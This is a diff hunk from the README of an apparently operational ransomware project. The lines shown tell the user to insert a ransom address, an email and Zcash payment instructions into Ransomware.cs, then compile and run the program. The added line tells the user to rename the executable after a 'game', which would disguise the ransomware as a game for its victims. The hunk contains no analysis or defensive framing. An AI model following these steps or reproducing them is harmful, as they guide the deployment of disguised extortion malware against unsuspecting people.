@@ -14,7 +14,7 @@ This program can be used to encrypt and decrypt files with ransomware.
 * Allows for decryption of files with the input of correct decryption key
 
 ## Instructions
-
+(change the name of the .exe file to suit the name of your compiled game name.. ex:   My_Game.exe)
 1. Download or clone the repository to your system.
 2. Add your ransom address, email, and Zcash payment receipt instructions in the `GenerateRansomNotes()` method in the `Ransomware.cs` file.
 3. Compile and run the program.
